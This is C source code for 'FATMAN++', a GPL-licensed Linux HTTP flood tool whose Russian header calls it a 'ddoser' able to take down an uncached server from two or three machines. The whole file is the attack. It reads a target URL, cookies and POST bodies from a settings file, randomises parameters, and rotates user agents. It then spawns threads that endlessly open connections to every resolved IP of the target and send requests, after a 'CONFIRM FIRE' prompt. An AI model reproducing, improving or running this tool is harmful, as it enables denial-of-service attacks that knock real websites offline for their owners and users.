/******************************************************************************
    FATMAN++. The Last Argument of Kings
    Copyright (C) 2011 hagall

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.				
				
 FATMAN++. Последний довод королей.
 Своеобразный "ддосер", дёргающий страницы с сайта по заданному шаблону.
 При отсутствии кэширования и хешлимита на сервере можно положить его с 2-3
 машин.
 
 
 Автор: hagall (vk: http://vk.com/vandrare, 
 		jabber: hagall@vataku.org,
 		email: hagall@vataku.org)		


Release5, 110922
Версия для Linux
******************************************************************************/
#define RELEASE_VERSION "F-110922"
#define MAX_PATH 1024

#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>      
#include <netinet/in.h>     

char     	*gsTarget,
	 	*gsCookies,
	 	*gsPost,
	 	*gsDomain,
	 	*gsLink,
	 	*gsApiHash;
	 
char*    	*gsUserAgents;
unsigned int 	cUseragents 	= 0;

int       	gsThreads 	= 0,
	  	gsPort    	= 0,
	  	gsIpsCount 	= 0,
	  	gsStripLogs 	= 0;
	  
char	  	gReplaceCookies = 1,
          	gReplaceTarget 	= 1,
          	gReplacePost 	= 1;
	  
const char defUserAgent[] = "Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10";	  

struct sockaddr_in *gsSockAddrs;

pthread_mutex_t gMutex = PTHREAD_MUTEX_INITIALIZER;

										// Ёбаная itoa, видите ли, нестандартна. 
										// Спиздил этот код с гугла для обеспечения 
										// переносимости на разные дистры. 
int my_itoa(int val, char* buf)
{
    const unsigned int radix = 10;

    char* p;
    unsigned int a;        //every digit
    int len;
    char* b;            //start of the digit char
    char temp;
    unsigned int u;

    p = buf;

    if (val < 0)
    {
        *p++ = '-';
        val = 0 - val;
    }
    u = (unsigned int)val;

    b = p;

    do
    {
        a = u % radix;
        u /= radix;

        *p++ = a + '0';

    } while (u > 0);

    len = (int)(p - buf);

    *p-- = 0;

    //swap
    do
    {
        temp = *p;
        *p = *b;
        *b = temp;
        --p;
        ++b;

    } while (b < p);

    return len;
}

										// Немного индийского кода
										// Rev1, 110911
int RangedRand(int range_max, int range_min)
{
	int u =(double)rand() / (RAND_MAX + 1) * (range_max - range_min) + range_min;
	return u;
}

										// Чтение файла настроек. Тоже индийское. 
										// Rev1, 110911
char *IniRead(char *filename, char *section)
{
	FILE *file;
	char *buf;
	char *szSection = 0;
	char *out = (char*)malloc(512);
	buf = (char*)malloc(1024);
	szSection = (char*)malloc(50);
	*out = 0;
	file = fopen(filename, "r");
	if (file != 0)
	{
		while (fgets(buf, 1024, file) != NULL)
		{
			char *s;
			char *iLeftBorder = 0, *iRightBorder = 0;
			*szSection = 0;

			for (s = buf; *s != 0; s++)
			{
				if (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
				{
					if (iRightBorder == 0 && iLeftBorder != 0)
						iRightBorder = s - 1;
				}
				else
					if (iLeftBorder == 0)
						iLeftBorder = s;

				if ((*s == '=') && (*szSection == 0))
				{
					memcpy((void*)szSection, iLeftBorder, iRightBorder - iLeftBorder + 1);
					szSection[iRightBorder - iLeftBorder + 1] = 0;
					iLeftBorder = 0;
					iRightBorder = 0;
				}
			}

			if (iRightBorder == 0)
				iRightBorder == s - 1;
			if (strcmp(section, szSection) == 0 && iLeftBorder != 0)
			{
				memcpy((void*)out, iLeftBorder, iRightBorder - iLeftBorder + 1);
				out[iRightBorder - iLeftBorder + 1] = 0;
				break;
			}
				
		}
	}

	return out;
}

										// Индийские регулярки. Парсим и 
										// заменяем rand
										// Rev2, 110912
int replaceRand(char* szString)
{
	char* szBuf = (char*)malloc(strlen(szString));
	char* pRand;
	char szValue[10];

	while (pRand = strstr(szString, "rand"))
	{
		int nVal1 = 0;
		int nVal2 = 0;
		char* pOpenBrace = strstr(pRand, "(");
		char* pEndBrace = strstr(pRand, ")");
		char* pComma = strstr(pRand, ",");
		char  pVal1[10], pVal2[10];

		if (pOpenBrace == NULL || pEndBrace == NULL || pComma == NULL || 
			pEndBrace < pOpenBrace || pComma < pOpenBrace || pComma > pEndBrace)
			return 0;
				
		memcpy((void*)&pVal1, pOpenBrace + 1, pComma - pOpenBrace - 1);
		pVal1[pComma - pOpenBrace - 1] = 0;
		memcpy((void*)&pVal2, pComma + 1, pEndBrace - pComma - 1);
		pVal2[pEndBrace - pComma - 1] = 0;
	
		nVal1 = atoi(pVal1);
		nVal2 = atoi(pVal2);
		if (nVal1 == 0 || nVal2 == 0) return 0;
		nVal1 = RangedRand(nVal1, nVal2);
		
		
		my_itoa(nVal1, (char*)&szValue);
	
		strcpy(szBuf, pEndBrace + 1);
		memcpy((void*)pRand, (void*)&szValue, strlen(szValue));
		strcpy(pRand + strlen(szValue), szBuf);
	}
	return 1;
}

										// Собственно главная DDOS-нить
										// Rev1, 110911
void *ddosThread(void* param)
{
	char szRequest[4096], szHeaders[1024];
	char *szTarget, *szPost, *szCookies;
	char *lpszIpAddr;
	char szLen[10];
	long iCurrent = 0;
	int  iIpIdx = 0;
	int s;

	static int gThread = 0;
	int nThread = gThread;
	gThread++;
	
	iIpIdx = nThread % gsIpsCount;
	lpszIpAddr = inet_ntoa(gsSockAddrs[iIpIdx].sin_addr);
	

	if (gsTarget[0] != 0)
		szTarget = malloc(strlen(gsTarget) * 2);
	if (gsPost[0] != 0)
		szPost = malloc(strlen(gsPost) * 2);
	if (gsCookies[0] != 0)
		szCookies = malloc(strlen(gsCookies) * 2);

	if (strlen(gsPost) == 0)
	{
		strcpy(szHeaders, "Host: ");
		strcat(szHeaders, gsDomain);
		strcat(szHeaders, "\n");
		strcat(szHeaders, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\n");
		strcat(szHeaders, "Accept-Language: ru,en-us;q=0.7,en;q=0.3\n");
		strcat(szHeaders, "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7\n");
		strcat(szHeaders, "Keep-Alive: 300\n");
		strcat(szHeaders, "Connection: keep-alive\n");
	}
	else
	{
		strcpy(szHeaders, "Host: ");
		strcat(szHeaders, gsDomain);
		strcat(szHeaders, "\n");
		strcat(szHeaders, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\n");
		strcat(szHeaders, "Accept-Language: ru,en-us;q=0.7,en;q=0.3\n");
		strcat(szHeaders, "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7\n");
		strcat(szHeaders, "Keep-Alive: 300\n");
		strcat(szHeaders, "Connection: keep-alive\n");
	}

	while (++iCurrent)
	{
		if (gsPost[0] == 0)
			strcpy(szRequest, "GET /");
		else
			strcpy(szRequest, "POST /");

		if (gsTarget[0] != 0)
		{
			strcpy(szTarget, gsTarget);
			if (gReplaceTarget == 1)
				replaceRand(szTarget);
			strcat(szRequest, szTarget);
		}
		strcat(szRequest, " HTTP/1.1\n");
		strcat(szRequest, szHeaders);
		strcat(szRequest, "User-Agent: ");
		
		if (cUseragents == 1)
			strcat(szRequest, gsUserAgents[0]);
		else	
			strcat(szRequest, gsUserAgents[RangedRand(cUseragents, 0)]);
			
		strcat(szRequest, "\n");
		
		if (gsCookies[0] != 0)
		{
			strcat(szRequest, "Cookie: ");
			strcpy(szCookies, gsCookies);
			if (gReplaceCookies)
				replaceRand(szCookies);
			strcat(szRequest, szCookies);
			strcat(szRequest, "\n");
		}
		

		if (gsPost[0] != 0)
		{
			strcat(szRequest, "Content-Type: application/x-www-form-urlencoded\n");
			strcat(szRequest, "Content-Length: ");
			my_itoa(strlen(gsPost), szLen);
			strcat(szRequest, (char*)&szLen);
			strcat(szRequest, "\n\n");
			
			strcpy(szPost, gsPost);
			if (gReplacePost)
				replaceRand(szPost);
			strcat(szRequest, szPost);
			strcat(szRequest, "\n\n");
		}
		else
			strcat(szRequest, "\n\n");			

		if ( (s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) <= 0)
		{
			pthread_mutex_lock(&gMutex);
			printf("Thread %d (%s). Iteration %d. ERROR: Cannot create socket!\n", nThread, lpszIpAddr, iCurrent);
			pthread_mutex_unlock(&gMutex);
		}

		if (connect(s, (struct sockaddr*)&gsSockAddrs[iIpIdx], sizeof(struct sockaddr_in)) < 0)
		{
			pthread_mutex_lock(&gMutex);
			printf("Thread %d (%s). Iteration %d. ERROR: Connection error!\n", nThread, lpszIpAddr, iCurrent);
			pthread_mutex_unlock(&gMutex);
		}
		else
		{
			if (send(s, (char*)&szRequest, strlen(szRequest), 0) <= 0)
				printf("Thread %d (%s). Iteration %d. ERROR: Data sending error!\n", nThread, lpszIpAddr, iCurrent);
			else
				if (iCurrent % 5 == 0 || gsStripLogs == 0)
				{
					pthread_mutex_lock(&gMutex);
					printf("Thread %d (%s). Iteration %d. OK.\n", nThread, lpszIpAddr, iCurrent);
					pthread_mutex_unlock(&gMutex);
					
				}
			//close(s);
		}
	}

	return 0;
}

										// Rev2, 110912
int main(int argc, char* argv[])
{

	char myfile[MAX_PATH];
	char* sIndex;
	char* szThreads;
	char* szTimeout;
	char* szStripLogs;
	char* s;
	char* portStart;
	char* domainStart;
	char* reqAddrStart;
	char cRequest;
	FILE *fUseragents = NULL;
	char bFileOpened = 0;
	char buf[1024];
	signed int apiRes = 0;
	
	struct hostent *hDomainData;
	signed int tmp;
	int i;

	srand(time(NULL));
								
	strcpy((char*)&myfile, "settings.ini");

	printf("FATMAN++\n---------------------------------------------\n");
	printf("The Last Argument of Kings\nRelease: ");
	printf(RELEASE_VERSION);
	printf("\nCoded by hagall\n");
	printf("---------------------------------------------\n");

	gsTarget = (char*)malloc(350);
	gsCookies = (char*)malloc(5000);
	gsPost = (char*)malloc(1024);
	gsDomain = (char*)malloc(100);
	gsApiHash = (char*)malloc(50);

	szThreads = (char*)malloc(3);
	szTimeout = (char*)malloc(3);
	szStripLogs = (char*)malloc(5);
	
										// Чтение настроек и парсинг адреса
	gsTarget = IniRead((char*)&myfile, "target");
	gsLink = IniRead((char*)&myfile, "target");	
	gsCookies = IniRead((char*)&myfile, "cookies");
	gsPost = IniRead((char*)&myfile, "post");
	szThreads = IniRead((char*)&myfile, "threads");
	gsApiHash = IniRead((char*)&myfile, "apihash");
	
	szStripLogs = IniRead((char*)&myfile, "striplogs");

	gsThreads = atoi(szThreads);
	gsStripLogs = atoi(szStripLogs);

	if (gsThreads == 0 || strlen(gsTarget) < 3)
	{
		printf("Invalid settings found!\n");
		getchar();
		return 0;
	}
										// Парсим адрес
	s = gsTarget;
	portStart = NULL;
	domainStart = gsTarget;
	reqAddrStart = NULL;

	while (*(++s))
	{
		if (s[0] == ':' && s[1] > '0' && s[1] < '9')
			portStart = s;
		if (s[0] == '/' && domainStart == gsTarget && s[1] == '/')
		{
			domainStart = s + 2;
			s[1] = '!';
			s[0] = '!';
		}
		if (s[0] == '/' && reqAddrStart == NULL && s[1] != '/')
			reqAddrStart = s;
	}

	if (reqAddrStart == NULL)
	{
		gsTarget = "/";
	}
	else
	{
		gsTarget = reqAddrStart + 1;
		*reqAddrStart = 0;
	}

	if (domainStart != NULL)
	{
		gsDomain = domainStart;
	}
		
	if (portStart != NULL)
	{
		portStart++;
		gsPort = atoi(portStart);
		portStart--;
		*portStart = 0;
	}
	else
		gsPort = 80;
										// Читаем список юзерагентов
	fUseragents = fopen("useragents.txt", "r");
										// Индийский код, blame on TCC! 
	
	if (fUseragents != 0)
	{
		while (fgets((char*)&buf, 1024, fUseragents) != NULL) 
			cUseragents++;
		fclose(fUseragents);			
	}
	
		
	if (cUseragents > 0)
	{
		unsigned int i, delta = 0;
		gsUserAgents = (char**)malloc(cUseragents * sizeof(char**));
		fUseragents = fopen("useragents.txt", "r");
		if (fUseragents == NULL)
		{
			printf("Where have useragents.txt been gone?!\n");
			getchar();
			return 0;
		}

		for (i = 0; i < cUseragents; i++)
		{
			fgets((char*)&buf, 1024, fUseragents);
			if (strlen((char*)&buf) > 4)
			{
				if (buf[strlen((char*)&buf) - 1] == 13 || buf[strlen((char*)&buf) - 1] == 10)
					buf[strlen((char*)&buf) - 1] = 0;
				gsUserAgents[i - delta] = (char*)malloc( sizeof(char*) * (strlen((char*)&buf) + 10) );
				strcpy(gsUserAgents[i - delta], (char*)&buf);
			}
			else
				delta++;
		}
		
		cUseragents -= delta;
		fclose(fUseragents);
	}												
	
	if (cUseragents == 0)
	{
		gsUserAgents = (char**)malloc(sizeof(char*));
		gsUserAgents[0] = (char*)&defUserAgent;
		cUseragents = 1;
	}
	
										// Определяем, что из данных нужно парсить
	gReplaceTarget = (char)(strstr(gsTarget, "rand") != NULL);
	gReplaceCookies = (char)(strstr(gsCookies, "rand") != NULL);
	gReplacePost = (char)(strstr(gsPost, "rand") != NULL);
	
										// Определяем IP-адреса
	hDomainData = gethostbyname(gsDomain);
	if (hDomainData == NULL)
	{
		printf("ERROR: Cannot determine target's IP!\n");
		getchar();
		return 0;
	}

	if (hDomainData->h_addrtype != AF_INET || hDomainData->h_length != 4)
	{
		printf("IMPOSSIBLE ERROR! OH MY FUCKEN GOD ARMAGEDDON IS COMING!!!11\n");
		getchar();
		return 0;
	}

	while (hDomainData->h_addr_list[gsIpsCount++] != 0);

	printf("---------------------------------------------\n");
	printf("Host:        %s \n", gsDomain);
	printf("Port:        %d \n", gsPort);
	printf("Request:     %s \n", gsTarget);
	printf("UserAgents:  %d \n", cUseragents);
	printf("Threads:     %d \n", gsThreads);
	printf("IPs found:   %d \n", --gsIpsCount);
	printf("IP list:     ");
	for (i = 0; hDomainData->h_addr_list[i] != 0; i++)
	{
		struct in_addr saddr;
		saddr.s_addr = * (unsigned long *)hDomainData->h_addr_list[i];
		printf("%s\n             ", inet_ntoa(saddr));
	
	}

	printf("\n---------------------------------------------\n");
	printf("PRESS ENTER TO CONFIRM FIRE!\n");
	getchar();
	
	gsSockAddrs = malloc((gsIpsCount + 1) * sizeof(struct sockaddr_in));
	tmp = 0;
	while (hDomainData->h_addr_list[tmp++] != 0)
	{
		memset((void*)&gsSockAddrs[tmp - 1], 0, sizeof(struct sockaddr_in));
		gsSockAddrs[tmp - 1].sin_family = AF_INET;
		gsSockAddrs[tmp - 1].sin_port = htons(gsPort);
		gsSockAddrs[tmp - 1].sin_addr.s_addr = * (unsigned long*)hDomainData->h_addr_list[tmp - 1];
	}

	pthread_t pthreadid;
	for (i = 0; i < gsThreads; i++)
	{
		pthread_create(&pthreadid, NULL, ddosThread, NULL);
	}
	sleep(500000000);
	getchar();
	return 0;
}


